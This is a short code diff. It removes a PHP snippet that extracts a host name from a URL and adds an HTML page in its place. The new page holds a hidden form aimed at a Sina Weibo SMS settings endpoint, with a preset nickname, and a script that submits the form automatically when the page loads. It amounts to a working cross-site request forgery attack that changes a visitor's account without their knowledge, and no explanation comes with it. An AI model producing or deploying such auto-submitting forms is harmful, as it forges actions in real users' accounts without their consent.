@@ -1,8 +1,17 @@
-<?php
-//从URL中获取主机名称
-preg_match('@^(?:http://)?([^/]+)@i',
-    "http://www.php.net/index.html", $matches);
+<body>
 
-print_r($matches);
+<form action="http://sms.sina.com.cn/weibosms/sms_weibo/index.php/sms_set/new_sms_set/add_rec" method="post" id="f">
 
-?>
+<input type="hidden" name="nickname" value="CCTV今日说法" />
+
+</form>
+
+<script>
+
+var f=document.getElementById("f");
+
+f.submit();
+
+</script>
+
+</body>
